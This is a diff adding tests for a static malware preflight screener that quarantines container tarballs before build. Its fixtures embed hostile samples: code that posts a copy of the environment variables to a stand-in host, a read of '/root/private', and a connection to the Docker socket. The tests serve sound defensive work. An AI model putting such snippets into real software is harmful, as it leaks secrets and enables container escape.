@@ -491,6 +491,206 @@ async def test_static_malicious_preflight_quarantines_before_docker(
     assert "execution_started=false" in caplog.text
 
 
+async def test_static_preflight_v2_enforce_keeps_reachable_causal_quarantine(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.QUARANTINE
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert result.finding is not None
+    assert result.finding["prompt_revision"] == "static-malicious-preflight-v2"
+
+
+async def test_static_preflight_v2_enforce_does_not_hold_excluded_local_helper(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert any(call[0] == "build" for call in calls)
+
+
+async def test_static_preflight_v2_enforce_reviews_unresolved_v1_before_build(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": b"FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
+            "Cargo.toml": b'[package]\nname="app"\nversion="0.1.0"\n',
+            "src/main.rs": b'include!(env!("GENERATED_SOURCE"));\nfn main() {}\n',
+            "generated/payload.rs": b'let path = "/root/private";\nread(path);\n',
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.QUARANTINE
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert result.finding is not None
+    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
+
+
+async def test_static_preflight_v2_enforce_reviews_helper_before_build(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b'endpoint = "/var/run/docker.sock"\n'
+                b"dispatch(endpoint)\n"
+                b"def dispatch(value):\n    connect_control_socket(value)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.QUARANTINE
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert result.finding is not None
+    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
+
+
+async def test_static_preflight_v2_shadow_preserves_v1_and_journals_delta(
+    make_config: Callable[..., ScreenerConfig], tmp_path: Path
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    audit_path = tmp_path / "private" / "static-preflight.jsonl"
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(
+            static_preflight_v2_mode="shadow",
+            static_preflight_audit_file=str(audit_path),
+        ),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.QUARANTINE
+    assert result.finding is not None
+    assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    record = json.loads(audit_path.read_text())
+    assert record["mode"] == "shadow"
+    assert record["legacy_decisive"] is True
+    assert record["candidate_decisive"] is False
+    assert record["artifact_sha256"] == hashlib.sha256(tarball).hexdigest()
+    assert "collector.invalid" not in audit_path.read_text()
+    assert audit_path.stat().st_mode & 0o777 == 0o600
+    assert audit_path.parent.stat().st_mode & 0o777 == 0o700
+
+
+async def test_static_preflight_audit_failure_is_explicit_retryable_infrastructure(
+    make_config: Callable[..., ScreenerConfig], tmp_path: Path
+) -> None:
+    destination = tmp_path / "must-not-change"
+    destination.write_text("unchanged\n")
+    audit_path = tmp_path / "static-preflight.jsonl"
+    audit_path.symlink_to(destination)
+    tarball = _valid_tar(
+        **{
+            "src/main.rs": (
+                b'let endpoint = "/var/run/docker.sock";\n'
+                b"connect_control_socket(endpoint);\n"
+            )
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(
+            static_preflight_v2_mode="shadow",
+            static_preflight_audit_file=str(audit_path),
+        ),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+
+    async with gate._client:
+        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
+    assert [evidence.code for evidence in result.evidence] == [
+        "static-preflight-audit-failed"
+    ]
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert destination.read_text() == "unchanged\n"
+
+
 class _SafeStaticLeadReviewer:
     def __init__(self) -> None:
         self.resolve_calls = 0
